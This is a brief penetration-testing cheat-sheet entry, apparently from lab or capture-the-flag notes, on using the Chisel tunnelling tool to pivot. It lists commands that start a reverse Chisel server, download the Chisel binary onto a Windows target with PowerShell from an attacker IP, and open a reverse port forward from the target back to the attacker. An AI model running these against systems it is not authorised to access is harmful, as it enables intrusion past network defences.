# Chisel

is a tool using SOCKS and allows you to forward traffic from an local service
to your local machine.

---

#### Syntax

executing command on local instance

chisel server -p 9999 --reverse

upload correct chisel file (x64/x86) into target

powershell -c iwr http://10.10.14.187:8000/chisel_winx64.exe

executing command on target windows x64 server

chisel_winx64.exe client 10.10.14.187:<chisel_server_port> R:<local_machine_port>:localhost:<service_port>

chisel2.exe client 10.10.14.187:9999 R:8888:localhost:8888


